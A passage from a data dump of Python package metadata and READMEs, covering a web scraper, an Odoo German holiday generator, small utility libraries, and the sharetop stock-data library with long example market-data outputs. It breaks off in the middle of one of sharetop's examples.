                    ""url"": 
                    ""hops"": 
                    ""tags"":
                    ""classes"":
                    ""attrs"":
                    ""attrV"":
                    ""IDv"":
                    ""selectors"":
                }
```

Example of YAML file (If you choose this path call the config_parser function and give it a valid path!):

```yaml
        IDv:
        attrV: []
        attrs: []
        classes: []
        hops: 
        selectors: []
        tags:
        - 
        - 
        url: 
```

## Example Usage

```python

        from CobWeb import Spider, Scraper

        # Create a Spider object with a URL and maximum number of hops
        spider = Spider(""https://example.com"", max_hops=10)

        # Get the internal and external links
        internal_links, external_links = spider.showLinks()

        # Create a Scraper object with a configuration dictionary
        # hops defines how deep it will scrape, it uses the Spider internally to get more links and scrape from those pages! If you just want to scrape from a single page set it to 0 or don't provide hops
        config = {
            ""url"": ""https://example.com"",
            ""hops"": 2,
            ""tags"": [""h1"", ""p""]
        }
        scraper = Scraper(config)

        # Scrape HTML content from web pages based on user-defined parameters
        results = scraper.run()

        # Print the results it shall be a dictionary with arrays of scraped content separated by element, attributes, etc provided in the config!
        print(results)


```
",goncalomark/amara-cobweb
odoo-addon-l10n-de-holidays,https://github.com/OCA/l10n-germany,2,1938,1853,".. image:: https://img.shields.io/badge/licence-AGPL--3-blue.svg
   :target: http://www.gnu.org/licenses/agpl
   :alt: License: AGPL-3

===============================================
Hr Holidays Public Generator DE
===============================================

This module extends the hr.holidays.public.generator model
and implements the functionality needed to generate and copy
the public holidays in Germany.


Usage
=====

Go to ""Leaves/Public Holidays/Generate Public Holidays""
* Choose ""Year"" for which the public holidays will be generated
* Choose ""Germany"" in the ""Country"" dropdown
* ""State"" field
** Choose ""State"" if you want the holidays only for specific state
** Leave ""State"" empty if you want all public holidays

* ""From Template"" field

Choose ""From Template"". This will be used as template and all
holidays with field ""Date may change"" = False (static holidays),
will be copied. All floating holidays (""Date may change"" = True ),
will be calculated for the relevant ""Year""

* press ""Generate"" button


Bug Tracker
===========

Bugs are tracked on `GitHub Issues
<https://github.com/OCA/hr/issues>`_. In case of trouble, please
check there if your issue has already been reported. If you spotted it first,
help us smash it by providing detailed and welcomed feedback.

Credits
=======

Contributors
------------

* Yu Weng <yweng@elegosoft.com>
* Nikolina Todorova <nikolina.todorova@initos.com>

Do not contact contributors directly about support or help with technical issues.

Maintainer
----------

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

This module is maintained by the OCA.

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

To contribute to this module, please visit https://odoo-community.org.


",".. image:: https://img.shields.io/badge/licence-AGPL--3-blue.svg
   :target: http://www.gnu.org/licenses/agpl
   :alt: License: AGPL-3

===============================================
Hr Holidays Public Generator DE
===============================================

This module extends the hr.holidays.public.generator model
and implements the functionality needed to generate and copy
the public holidays in Germany.


Usage
=====

Go to ""Leaves/Public Holidays/Generate Public Holidays""
* Choose ""Year"" for which the public holidays will be generated
* Choose ""Germany"" in the ""Country"" dropdown
* ""State"" field
** Choose ""State"" if you want the holidays only for specific state
** Leave ""State"" empty if you want all public holidays

* ""From Template"" field

Choose ""From Template"". This will be used as template and all
holidays with field ""Date may change"" = False (static holidays),
will be copied. All floating holidays (""Date may change"" = True ),
will be calculated for the relevant ""Year""

* press ""Generate"" button


Bug Tracker
===========

Bugs are tracked on `GitHub Issues
`_. In case of trouble, please
check there if your issue has already been reported. If you spotted it first,
help us smash it by providing detailed and welcomed feedback.

Credits
=======

Contributors
------------

* Yu Weng 
* Nikolina Todorova 

Do not contact contributors directly about support or help with technical issues.

Maintainer
----------

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

This module is maintained by the OCA.

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

To contribute to this module, please visit https://odoo-community.org.


",oca/l10n-germany
bs-python-utils,https://github.com/bsalanie/bs-python-utils,7,1119,730,"# bs-python-utils

<!-- [![Release](https://img.shields.io/github/v/release/bsalanie/bs-python-utils)](https://img.shields.io/github/v/release/bsalanie/bs-python-utils) -->
[![Build status](https://img.shields.io/github/actions/workflow/status/bsalanie/bs-python-utils/main.yml?branch=main)](https://github.com/bsalanie/bs-python-utils/actions/workflows/main.yml?query=branch%3Amain)
<!-- [![codecov](https://codecov.io/gh/bsalanie/bs-python-utils/branch/main/graph/badge.svg)](https://codecov.io/gh/bsalanie/bs-python-utils) -->
[![Commit activity](https://img.shields.io/github/commit-activity/m/bsalanie/bs-python-utils)](https://img.shields.io/github/commit-activity/m/bsalanie/bs-python-utils)
[![License](https://img.shields.io/github/license/bsalanie/bs-python-utils)](https://img.shields.io/github/license/bsalanie/bs-python-utils)

My Python utilities.

- **Github repository**: <https://github.com/bsalanie/bs-python-utils/>
- **Documentation** <https://bsalanie.github.io/bs-python-utils/>


### Release notes

#### 0.0.3  (April 24, 2023)
Satisfied mypy.

#### 0.0.2  (April 24, 2023)
Fixed main PyPI page.
","# bs-python-utils


[![Build status](https://img.shields.io/github/actions/workflow/status/bsalanie/bs-python-utils/main.yml?branch=main)](https://github.com/bsalanie/bs-python-utils/actions/workflows/main.yml?query=branch%3Amain)

[![Commit activity](https://img.shields.io/github/commit-activity/m/bsalanie/bs-python-utils)](https://img.shields.io/github/commit-activity/m/bsalanie/bs-python-utils)
[![License](https://img.shields.io/github/license/bsalanie/bs-python-utils)](https://img.shields.io/github/license/bsalanie/bs-python-utils)

My Python utilities.

- **Github repository**: 
- **Documentation** 


### Release notes

#### 0.0.3  (April 24, 2023)
Satisfied mypy.

#### 0.0.2  (April 24, 2023)
Fixed main PyPI page.
",bsalanie/bs-python-utils
pyaipersonality,https://github.com/ParisNeo/PyAIPersonality,4,1174,1174,"# PyAIPersonality

PyAIPersonality is a Python library for defining AI personalities for AI-based models. With PyAIPersonality, you can define a file format, assets, and personalized scripts to create unique AI personalities.

## Installation

You can install PyAIPersonality using pip:
```bash
pip install pyaipersonality
```

## Usage

Here's an example of how to use PyAIPersonality to load an AI personality and print its attributes:

```python
from pyaipersonality import AIPersonality

if __name__ == ""__main__"":
    personality = AIPersonality(""personalities_zoo/english/general/gpt4all_chat_bot"")
    print(""Done"")
    print(f""{personality}"")
```

# Contributing
Contributions to PyAIPersonality are welcome! If you'd like to contribute, please follow these steps:

1. Fork this repository
2. Create a new branch (`git checkout -b my-new-branch`)
3. Make your changes
4. Commit your changes (`git commit -am 'Add some feature'`)
5. Push to the branch (`git push origin my-new-branch`)
6. Create a new pull request


# License
PyAIPersonality is licensed under the Apache 2.0 license. See the `LICENSE` file for more information.
","# PyAIPersonality

PyAIPersonality is a Python library for defining AI personalities for AI-based models. With PyAIPersonality, you can define a file format, assets, and personalized scripts to create unique AI personalities.

## Installation

You can install PyAIPersonality using pip:
```bash
pip install pyaipersonality
```

## Usage

Here's an example of how to use PyAIPersonality to load an AI personality and print its attributes:

```python
from pyaipersonality import AIPersonality

if __name__ == ""__main__"":
    personality = AIPersonality(""personalities_zoo/english/general/gpt4all_chat_bot"")
    print(""Done"")
    print(f""{personality}"")
```

# Contributing
Contributions to PyAIPersonality are welcome! If you'd like to contribute, please follow these steps:

1. Fork this repository
2. Create a new branch (`git checkout -b my-new-branch`)
3. Make your changes
4. Commit your changes (`git commit -am 'Add some feature'`)
5. Push to the branch (`git push origin my-new-branch`)
6. Create a new pull request


# License
PyAIPersonality is licensed under the Apache 2.0 license. See the `LICENSE` file for more information.
",parisneo/pyaipersonality
openz,https://github.com/Cologler/openz-python,3,853,853,"# openz

[![Python Testing](https://github.com/Cologler/openz-python/actions/workflows/testing.yml/badge.svg)](https://github.com/Cologler/openz-python/actions/workflows/testing.yml)

A strange file opener.

## Usage

``` python
from openz import open_for_write, try_rollback

with open_for_write(
            path,
            text_mode=True,
            overwrite=True,
            with_atomicwrite=True,
            with_lockfile=True,
            with_exclusive=False, # unable work with `with_atomicwrite`
            with_backup=True
        ) as fp:

    fp.write('content')
```

### Restore data from crash

Make sure set `with_backup=True` and `backup_for_fault=True`:

``` python
with open_for_write(path, with_backup=True, backup_for_fault=True) as fp:
    ...
```

Then you can restore it from the backup:

``` python
try_rollback(path)
```
","# openz

[![Python Testing](https://github.com/Cologler/openz-python/actions/workflows/testing.yml/badge.svg)](https://github.com/Cologler/openz-python/actions/workflows/testing.yml)

A strange file opener.

## Usage

``` python
from openz import open_for_write, try_rollback

with open_for_write(
            path,
            text_mode=True,
            overwrite=True,
            with_atomicwrite=True,
            with_lockfile=True,
            with_exclusive=False, # unable work with `with_atomicwrite`
            with_backup=True
        ) as fp:

    fp.write('content')
```

### Restore data from crash

Make sure set `with_backup=True` and `backup_for_fault=True`:

``` python
with open_for_write(path, with_backup=True, backup_for_fault=True) as fp:
    ...
```

Then you can restore it from the backup:

``` python
try_rollback(path)
```
",cologler/openz-python
sharetop,https://github.com/nrliangxy/sharetop,8,32188,32174,"## Introduction

[![Python Version](https://img.shields.io/badge/python-3.6+-blue.svg?style=flat)](https://pypi.python.org/pypi/sharetop)
[![Pypi Package](https://img.shields.io/pypi/v/sharetop.svg?maxAge=60)](https://pypi.python.org/pypi/sharetop)
[![Pypi-Install](https://img.shields.io/pypi/dm/sharetop.svg?maxAge=2592000&label=installs&color=%2327B1FF)](https://pypi.python.org/pypi/sharetop)
[![Github Stars](https://img.shields.io/github/stars/sharetop/sharetop.svg?style=social&label=Star&maxAge=60)](https://github.com/nrliangxy/sharetop)

[`sharetop`](https://github.com/nrliangxy/sharetop) 是由个人打造的用于获取股票、基金、期货数据的免费开源 Python 库，你可以使用它很方便地获取数据以便更好地服务于个人的交易系统需求。

- [`Source Code`](https://github.com/nrliangxy/sharetop)

---

## Installation

- 通过 `pip` 安装

```bash
pip install sharetop
```

- 通过 `pip` 更新

```bash
pip install sharetop --upgrade
```

---

## Examples

### Stock

- 获取股票历史日 K 线数据

```python
>>> import sharetop as sp
>>> # 股票代码
>>> stock_code = '600519'
>>> sp.stock.get_history_data(stock_code)
      股票名称    股票代码          日期       开盘       收盘       最高       最低       成交量           成交额    振幅   涨跌幅    涨跌额    换手率
0     贵州茅台  600519  2001-08-27   -89.74   -89.53   -89.08   -90.07  406318.0  1.410347e+09 -1.10  0.92   0.83  56.83
1     贵州茅台  600519  2001-08-28   -89.64   -89.27   -89.24   -89.72  129647.0  4.634630e+08 -0.54  0.29   0.26  18.13
2     贵州茅台  600519  2001-08-29   -89.24   -89.36   -89.24   -89.42   53252.0  1.946890e+08 -0.20 -0.10  -0.09   7.45
3     贵州茅台  600519  2001-08-30   -89.38   -89.22   -89.14   -89.44   48013.0  1.775580e+08 -0.34  0.16   0.14   6.72
4     贵州茅台  600519  2001-08-31   -89.21   -89.24   -89.12   -89.28   23231.0  8.623100e+07 -0.18 -0.02  -0.02   3.25
...    ...     ...         ...      ...      ...      ...      ...       ...           ...   ...   ...    ...    ...
4756  贵州茅台  600519  2021-07-23  1937.82  1900.00  1937.82  1895.09   47585.0  9.057762e+09  2.20 -2.06 -40.01   0.38
4757  贵州茅台  600519  2021-07-26  1879.00  1804.11  1879.00  1780.00   98619.0  1.789436e+10  5.21 -5.05 -95.89   0.79
4758  贵州茅台  600519  2021-07-27  1803.00  1712.89  1810.00  1703.00   86577.0  1.523081e+10  5.93 -5.06 -91.22   0.69
4759  贵州茅台  600519  2021-07-28  1703.00  1768.90  1788.20  1682.12   85369.0  1.479247e+10  6.19  3.27  56.01   0.68
4760  贵州茅台  600519  2021-07-29  1810.01  1740.00  1823.00  1734.34   51035.0  9.067345e+09  5.01 -1.63 -28.90   0.41

[4761 rows x 13 columns]
```

- 获取非 A 股的股票 K 线数据（支持输入股票名称以及代码）

```python
>>> import sharetop as sp
>>> # 股票代码
>>> stock_code = 'AAPL'
>>> sp.stock.get_history_data(stock_code)
     股票名称  股票代码          日期      开盘      收盘      最高      最低          成交量           成交额    振幅   涨跌幅   涨跌额   换手率
0      苹果  AAPL  1984-09-07   -5.37   -5.37   -5.36   -5.37    2981600.0  0.000000e+00  0.00  0.00  0.00  0.02
1      苹果  AAPL  1984-09-10   -5.37   -5.37   -5.36   -5.37    2346400.0  0.000000e+00 -0.19  0.00  0.00  0.01
2      苹果  AAPL  1984-09-11   -5.36   -5.36   -5.36   -5.36    5444000.0  0.000000e+00  0.00  0.19  0.01  0.03
3      苹果  AAPL  1984-09-12   -5.36   -5.37   -5.36   -5.37    4773600.0  0.000000e+00 -0.19 -0.19 -0.01  0.03
4      苹果  AAPL  1984-09-13   -5.36   -5.36   -5.36   -5.36    7429600.0  0.000000e+00  0.00  0.19  0.01  0.04
...   ...   ...         ...     ...     ...     ...     ...          ...           ...   ...   ...   ...   ...
8739   苹果  AAPL  2021-07-22  145.94  146.80  148.19  145.81   77338156.0  1.137623e+10  1.64  0.96  1.40  0.47
8740   苹果  AAPL  2021-07-23  147.55  148.56  148.72  146.92   71447416.0  1.058233e+10  1.23  1.20  1.76  0.43
8741   苹果  AAPL  2021-07-26  148.27  148.99  149.83  147.70   72434089.0  1.080774e+10  1.43  0.29  0.43  0.44
8742   苹果  AAPL  2021-07-27  149.12  146.77  149.21  145.55  104818578.0  1.540140e+10  2.46 -1.49 -2.22  0.63
8743   苹果  AAPL  2021-07-28  144.81  144.98  146.97  142.54  118931191.0  1.723188e+10  3.02 -1.22 -1.79  0.72

[8744 rows x 13 columns]

>>> # 股票名称
>>> stock_name = '微软'
>>> sp.stock.get_history_data(stock_name)
       股票名称  股票代码          日期      开盘      收盘      最高      最低           成交量           成交额    振幅   涨跌幅   涨跌额    换手率
0      微软  MSFT  1986-03-13  -20.74  -20.73  -20.73  -20.74  1.031789e+09  0.000000e+00  0.00  0.00  0.00  13.72
1      微软  MSFT  1986-03-14  -20.73  -20.73  -20.73  -20.73  3.081600e+08  0.000000e+00  0.00  0.00  0.00   4.10
2      微软  MSFT  1986-03-17  -20.73  -20.73  -20.73  -20.73  1.331712e+08  0.000000e+00  0.00  0.00  0.00   1.77
3      微软  MSFT  1986-03-18  -20.73  -20.73  -20.73  -20.73  6.776640e+07  0.000000e+00  0.00  0.00  0.00   0.90
4      微软  MSFT  1986-03-19  -20.73  -20.73  -20.73  -20.73  4.789440e+07  0.000000e+00  0.00  0.00  0.00   0.64
...   ...   ...         ...     ...     ...     ...     ...           ...           ...   ...   ...   ...    ...
8357   微软  MSFT  2021-07-22  283.84  286.14  286.42  283.42  2.338406e+07  6.677062e+09  1.07  1.68  4.74   0.31
8358   微软  MSFT  2021-07-23  287.37  289.67  289.99  286.50  2.276807e+07  6.578686e+09  1.22  1.23  3.53   0.30
8359   微软  MSFT  2021-07-26  289.00  289.05  289.69  286.64  2.317607e+07  6.685868e+09  1.05 -0.21 -0.62   0.31
8360   微软  MSFT  2021-07-27  289.43  286.54  289.58  282.95  3.360407e+07  9.599993e+09  2.29 -0.87 -2.51   0.45
8361   微软  MSFT  2021-07-28  288.99  286.22  290.15  283.83  3.356685e+07  9.638499e+09  2.21 -0.11 -0.32   0.45

[8362 rows x 13 columns]
```

- 获取 ETF K 线数据

```python
>>> import sharetop as sp
>>> # ETF 代码（以中概互联网 ETF 为例）
>>> etf_code = '513050'
>>> sp.stock.get_history_data(etf_code)
      股票名称    股票代码          日期     开盘     收盘     最高     最低         成交量           成交额    振幅   涨跌幅    涨跌额    换手率
0     中概互联网ETF  513050  2017-01-18  0.989  0.977  0.989  0.969    345605.0  3.381795e+07  0.00  0.00  0.000   0.26
1     中概互联网ETF  513050  2017-01-19  0.978  0.989  0.990  0.978    257716.0  2.542553e+07  1.23  1.23  0.012   0.19
2     中概互联网ETF  513050  2017-01-20  0.989  0.988  0.990  0.986     50980.0  5.043289e+06  0.40 -0.10 -0.001   0.04
3     中概互联网ETF  513050  2017-01-23  0.988  0.988  0.989  0.986     13739.0  1.356129e+06  0.30  0.00  0.000   0.01
4     中概互联网ETF  513050  2017-01-24  0.989  0.989  0.992  0.987     17937.0  1.774398e+06  0.51  0.10  0.001   0.01
...        ...     ...         ...    ...    ...    ...    ...         ...           ...   ...   ...    ...    ...
1097  中概互联网ETF  513050  2021-07-23  1.789  1.760  1.789  1.758   4427623.0  7.836530e+08  1.73 -1.51 -0.027   3.32
1098  中概互联网ETF  513050  2021-07-26  1.679  1.645  1.698  1.642  13035366.0  2.182816e+09  3.18 -6.53 -0.115   9.78
1099  中概互联网ETF  513050  2021-07-27  1.600  1.547  1.620  1.546  14269546.0  2.257610e+09  4.50 -5.96 -0.098  10.70
1100  中概互联网ETF  513050  2021-07-28  1.545  1.552  1.578  1.506  13141023.0  2.024106e+09  4.65  0.32  0.005   9.85
1101  中概互联网ETF  513050  2021-07-29  1.615  1.641  1.651  1.606  10658041.0  1.734404e+09  2.90  5.73  0.089   7.99

[1102 rows x 13 columns]
```

- 获取单只股票 5 分钟 K 线数据

```python
>>> import sharetop as sp
>>> # 股票代码
>>> stock_code = '600519'
>>> # 5 分钟
>>> frequency = 5
>>> sp.stock.get_history_data(stock_code, klt=frequency)
      股票名称    股票代码                日期       开盘       收盘       最高       最低     成交量          成交额    振幅   涨跌幅    涨跌额   换手率
0     贵州茅台  600519  2021-06-16 09:35  2172.71  2159.71  2175.71  2150.74  1885.0  411159309.0  1.15 -0.64 -14.00  0.02
1     贵州茅台  600519  2021-06-16 09:40  2156.69  2148.71  2160.48  2143.37  1238.0  268790684.0  0.79 -0.51 -11.00  0.01
2     贵州茅台  600519  2021-06-16 09:45  2149.79  2159.71  2160.69  2149.79   706.0  153631002.0  0.51  0.51  11.00  0.01
3     贵州茅台  600519  2021-06-16 09:50  2159.61  2148.87  2159.71  2148.87   586.0  127346502.0  0.50 -0.50 -10.84  0.00
4     贵州茅台  600519  2021-06-16 09:55  2148.87  2161.04  2163.71  2148.72   788.0  171491075.0  0.70  0.57  12.17  0.01
...    ...     ...               ...      ...      ...      ...      ...     ...          ...   ...   ...    ...   ...
1521  贵州茅台  600519  2021-07-29 13:50  1746.51  1746.09  1748.95  1746.01   738.0  128889575.0  0.17 -0.09  -1.49  0.01
1522  贵州茅台  600519  2021-07-29 13:55  1746.08  1742.01  1746.09  1741.96   831.0  144968679.0  0.24 -0.23  -4.08  0.01
1523  贵州茅台  600519  2021-07-29 14:00  1742.00  1739.58  1742.00  1739.58   864.0  150446840.0  0.14 -0.14  -2.43  0.01
1524  贵州茅台  600519  2021-07-29 14:05  1741.87  1740.00  1745.00  1738.88  1083.0  188427970.0  0.35  0.02   0.42  0.01
1525  贵州茅台  600519  2021-07-29 14:10  1740.00  1740.02  1740.10  1740.00    59.0   10315488.0  0.01  0.00   0.02  0.00

[1526 rows x 13 columns]
```

- 沪深市场 A 股最新状况

```python
>>> import sharetop as sp
>>> sp.stock.get_market_real_time()
        股票代码   股票名称     涨跌幅     最新价      最高      最低      今开     涨跌额    换手率    量比    动态市盈率     成交量           成交额   昨日收盘           总市值         流通市值      行情ID 市场类型
0     688787    N海天  277.59  139.48  172.39  139.25  171.66  102.54  85.62     -    78.93   74519  1110318832.0  36.94    5969744000   1213908667  1.688787   沪A
1     301045    N天禄  149.34   39.42   48.95    39.2   48.95   23.61  66.66     -    37.81  163061   683878656.0  15.81    4066344240    964237089  0.301045   深A
2     300532   今天国际   20.04   12.16   12.16   10.69   10.69    2.03   8.85  3.02   -22.72  144795   171535181.0  10.13    3322510580   1989333440  0.300532   深A
3     300600   国瑞科技   20.02   13.19   13.19   11.11   11.41     2.2  18.61  2.82   218.75  423779   541164432.0  10.99    3915421427   3003665117  0.300600   深A
4     300985   致远新能   20.01   47.08   47.08    36.8    39.4    7.85  66.65  2.17    58.37  210697   897370992.0  39.23    6277336472   1488300116  0.300985   深A
...      ...    ...     ...     ...     ...     ...     ...     ...    ...   ...      ...     ...           ...    ...           ...          ...       ...  ...
4598  603186   华正新材   -10.0   43.27   44.09   43.27   43.99   -4.81   1.98  0.48    25.24   27697   120486294.0  48.08    6146300650   6063519472  1.603186   沪A
4599  688185  康希诺-U  -10.11   476.4  534.94  460.13   530.0   -53.6   6.02  2.74 -2088.07   40239  1960540832.0  530.0  117885131884  31831479215  1.688185   沪A
4600  688148   芳源股份  -10.57    31.3   34.39    31.3    33.9    -3.7  26.07  0.56   220.01  188415   620632512.0   35.0   15923562000   2261706043  1.688148   沪A
4601  300034   钢研高纳  -10.96   43.12   46.81   42.88    46.5   -5.31   7.45  1.77    59.49  323226  1441101824.0  48.43   20959281094  18706911861  0.300034   深A
4602  300712   永福股份  -13.71    96.9  110.94    95.4   109.0   -15.4   6.96  1.26   511.21  126705  1265152928.0  112.3   17645877600  17645877600  0.300712   深A

[4603 rows x 18 columns]
```

- 获取单只股或者多只最新状况

```python
>>> import sharetop as sp
>>> stock_code = '30033'
>>> sp.stock.get_real_time_data(stock_code)
        股票名称    股票代码     最新价    最高价    最低价  ...  市盈率(TTM)    市净率     涨跌值  涨跌幅(%)  振幅(%)
0  同花顺  300033  174.92  198.0  172.3  ...     55.27  15.63 -0.2009   -10.3  13.18
>>> stock_code = ['300033', '516110']
>>> sp.stock.get_real_time_data(stock_code)
{'300033':   股票名称    股票代码     最新价    最高价    最低价  ...  市盈率(TTM)    市净率     涨跌值  涨跌幅(%)  振幅(%)
0  同花顺  300033  174.92  198.0  172.3  ...     55.27  15.63 -0.2009   -10.3  13.18

[1 rows x 23 columns], '516110':     股票名称    股票代码    最新价    最高价  ...   内盘(手)       涨跌值  涨跌幅(%)  振幅(%)
0  汽车ETF  516110  0.945  0.953  ...  466383  0.000023   0.249  0.358

[1 rows x 19 columns]}
```

- 股票龙虎榜

```python
>>> import sharetop as sp
>>> # 获取最新一个公开的龙虎榜数据(后面还有获取指定日期区间的示例代码)
>>> sp.stock.get_daily_billboard()
    股票代码   股票名称        上榜日期                解读  ...   净买额占总成交比    成交额占总成交比          流通市值
                上榜原因
0    000021    深科技  2023-04-26  4家机构卖出，成功率60.41%  ...   2.373821   31.288324  2.661389e+10                          日跌幅偏离值达到7%的前5只证券
1    000150  *ST宜康  2023-04-26    主力做T，成功率29.56%  ... -21.126097   78.093035  4.352347e+08  连续三个交易日内，跌幅偏离值累计达到12%的ST证券、*ST证券和未完成股改证券
2    000606  *ST顺利  2023-04-26  北京资金卖出，成功率42.63%  ... -44.344337  138.384208  7.811153e+08  连续三个交易日内，跌幅偏离值累计达到12%的ST证券、*ST证券和未完成股改证券
3    000620    新华联  2023-04-26  1家机构卖出，成功率35.81%  ... -24.580743   42.757218  2.863903e+09                  连续三个交易日内，跌幅偏离值累计达到20%的证券
4    000719   中原传媒  2023-04-26  2家机构买入，成功率45.96%  ...   5.265043   29.831509  9.119907e+09                           日振幅值达到15% 的前5只证券
..      ...    ...         ...               ...  ...        ...         ...           ...                                       ...
106  688580   伟思医疗  2023-04-26  1家机构买入，成功率46.20%  ...   0.680386   45.458772  1.916985e+09               有价格涨跌幅限制的日收盘价格涨幅达到15%的前五只证券
107  832662   方盛股份  2023-04-26  普通席位买入，成功率33.33%  ...   7.829732   39.737402  1.787436e+08                          当日换手率达到20%的前5只股票
108  833394    民士达  2023-04-26  1家机构买入，成功率35.62%  ...  -0.423705   28.803391  4.664451e+08                          当日换手率达到20% 的前5只股票
109  872808   曙光数创  2023-04-26  1家机构买入，成功率28.49%  ... -10.998660   32.268764  3.259663e+09                        当日收盘价涨幅达到20%的前5只股票
110  900915   中路B股  2023-04-26  普通席位买入，成功率47.33%  ...  -4.542227   51.427620  5.588460e+09             有价格涨跌幅限制的日收盘价格涨幅偏离值达到7%的前五只证券

[111 rows x 16 columns]

>>> # 获取指定日期区间的龙虎榜数据
>>> start_date = '2023-04-07' # 开始日期
>>> end_date = '2023-04-25' # 结束日期
>>> sp.stock.get_daily_billboard(start_date = start_date,end_date = end_date)
           股票代码  股票名称        上榜日期                   解读    收盘价  ...        市场总成交额   净买额占总成交比   成交额占总成交比
 流通市值                         上榜原因
0    000521  长虹美菱  2023-04-25     3家机构买入，成功率36.54%   7.79  ...  7.065423e+08   2.079029  29.969549  7.207487e+09             日涨幅偏离值达到7%的前5只证券
1    000950  重药控股  2023-04-25     2家机构买入，成功率44.64%   7.03  ...  1.158314e+09   5.843986  29.801649  1.214914e+10             日涨幅偏离值达到7%的前5只证券
2    000950  重药控股  2023-04-25     2家机构买入，成功率43.67%   7.03  ...  1.737031e+09   3.719371  29.171036  1.214914e+10     连续三个交易日内，涨幅偏离值累计达到20%的证券
3    001269  欧晶科技  2023-04-25     4家机构卖出，成功率47.21%  95.46  ...  6.431845e+08 -11.481581  33.037047  3.279663e+09             日跌幅偏离值达到7%的前5只证券
4    001337  四川黄金  2023-04-25  西藏自治区资金买入，成功率37.01%  41.25  ...  9.748661e+08   1.426310  15.850799  2.475000e+09              日 换手率达到20%的前5只证券
..      ...   ...         ...                  ...    ...  ...           ...        ...        ...           ...                          ...
820  688112  鼎阳科技  2023-04-07     2家机构买入，成功率44.20%  89.56  ...  2.652485e+08 -13.693809  85.027009  2.650262e+09  有价格涨跌幅限制的 日收盘价格涨幅达到15%的前五只证券
821  688197  首药控股  2023-04-07     1家机构买入，成功率42.56%  52.10  ...  7.752080e+07   2.625985  37.326871  2.663924e+09  有价格涨跌幅限制的 日收盘价格涨幅达到15%的前五只证券
822  688292  浩瀚深度  2023-04-07     2家机构买入，成功率42.51%  38.77  ...  2.725678e+08   7.600839  34.555959  1.400885e+09  有价格涨跌幅限制的 日收盘价格涨幅达到15%的前五只证券
823  688525  佰维存储  2023-04-07       买一主买，成功率45.68%  75.30  ...  1.224959e+09   7.171807  23.722308  2.619422e+09  有价格涨跌幅限制的日收盘价格涨幅达到15%的前五只证券
824  688525  佰维存储  2023-04-07       买一主买，成功率45.68%  75.30  ...  1.224959e+09   7.171807  23.722308  2.619422e+09     有价格涨跌幅限制 的日换手率达到30%的前五只证券

[825 rows x 16 columns]
```

- 沪深 A 股股票季度表现

```python
>>> import sharetop as sp
>>> sp.stock.get_all_company_quarterly_report() # 默认为最新季度，亦可指定季度
        股票代码  股票简称                 公告日期          营业收入    营业收入同比增长  营业收入季度环比  ...   净利润季度环比    每股收益      每股净资产  净资产收益率      销售毛利率  每股经营现金流量
0     689009  九号公司  2023-04-27 00:00:00  1.661971e+09  -13.318009  -33.3121  ...  -69.2641  0.2400   6.989759    0.35  28.217862 -0.027784
1     688777  中控技术  2023-04-27 00:00:00  1.445708e+09   47.297685  -39.6880  ...  -71.4405  0.1800  10.750850    1.74  33.329184 -1.447543
2     688619   罗普特  2023-04-27 00:00:00  2.426531e+07  122.454886  -62.9774  ...   89.4008 -0.0900   6.769040   -1.34  29.015660 -0.328464
3     688618  三旺通信  2023-04-27 00:00:00  7.170795e+07   31.499767  -38.2247  ...  -66.1811  0.2300  15.892091    1.45  58.706983 -0.094093
4     688616  西力科技  2023-04-27 00:00:00  5.352820e+07  -23.243255  -65.1878  ...  -85.2866  0.0200   5.085878    0.36  25.904601  0.188316
...      ...   ...                  ...           ...         ...       ...  ...       ...     ...        ...     ...        ...       ...
2486  002772  众兴菌业  2023-04-11 00:00:00  6.229097e+08   27.595337   18.5618  ...  395.5582  0.5042   8.573732    5.69  43.228766  0.642276
2487  688700  东威科技  2023-04-08 00:00:00  2.343187e+08   20.234687  -28.8650  ...  -24.9129  0.3400   6.715296    5.25  45.157212  0.183051
2488  600557  康缘药业  2023-04-08 00:00:00  1.352494e+09   25.390576   10.3734  ...   -7.6349  0.2500   8.374359    2.93  75.100289 -0.103785
2489  600313  农发种业  2023-04-08 00:00:00  1.216816e+09   25.531891  -15.8044  ...  -75.2715  0.0361   1.641364    2.23  10.883559  0.109289
2490  603102  百合股份  2023-04-07 00:00:00  2.319653e+08   58.729728   12.5487  ...   43.5618  0.7000  22.919256    3.10  39.261229  0.160328

[2491 rows x 14 columns]

```

- 股票历史单子流入数据(日级)

```python
>>> import sharetop as sp
>>> sp.stock.get_history_bill('300033')
     [11]:
    股票名称    股票代码          日期        主力净流入        小单净流入        中单净流入        大单净流入  ...  主力净流入占比  小单流入净占 比  中单流入净占比  大单流入净占比  超大单流入净占比     收盘价    涨跌幅
0    同花顺  300033  2022-11-25     882089.0     224019.0   -1106108.0   -5475560.0  ...     0.23     0.06    -0.29    -1.42      1.65   91.70  -0.17
1    同花顺  300033  2022-11-28  -26657991.0   -1271355.0   27929346.0    7247576.0  ...    -7.12    -0.34     7.46     1.94     -9.06   89.77  -2.10
2    同花顺  300033  2022-11-29  -28424729.0   -7268909.0   35693632.0   -5113388.0  ...    -3.41    -0.87     4.28    -0.61     -2.79   95.87   6.80
3    同花顺  300033  2022-11-30   79732027.0  -38462589.0  -41269424.0  -15238245.0  ...     8.88    -4.28    -4.59    -1.70     10.57   98.06   2.28
4    同花顺  300033  2022-12-01  -78911985.0    2884073.0   76027920.0  -66718656.0  ...    -6.96     0.25     6.71    -5.88     -1.08  103.92   5.98
..   ...     ...         ...          ...          ...          ...          ...  ...      ...      ...      ...      ...       ...     ...    ...
97   同花顺  300033  2023-04-20 -111105712.0  -53784144.0  164889856.0  -79994960.0  ...    -3.30    -1.60     4.90    -2.38     -0.93  210.00   6.25
98   同花顺  300033  2023-04-21 -221531232.0  130341040.0   91190176.0  -66933888.0  ...    -8.75     5.15     3.60    -2.64     -6.11  196.20  -6.57
99   同花顺  300033  2023-04-24 -340801376.0  353636016.0  -12834656.0 -180464832.0  ...   -10.56    10.96    -0.40    -5.59     -4.97  185.00  -5.71
100  同花顺  300033  2023-04-25   64723600.0   43360432.0 -108084016.0  -18683920.0  ...     2.03     1.36    -3.40    -0.59      2.62  195.01   5.41
101  同花顺  300033  2023-04-26 -284631712.0  127536400.0  157095328.0   78138048.0  ...    -8.47     3.80     4.68     2.33    -10.80  174.92 -10.30

[102 rows x 15 columns]
```

- 股票最新一个交易日单子流入数据(分钟级)

```python
>>> import sharetop as sp
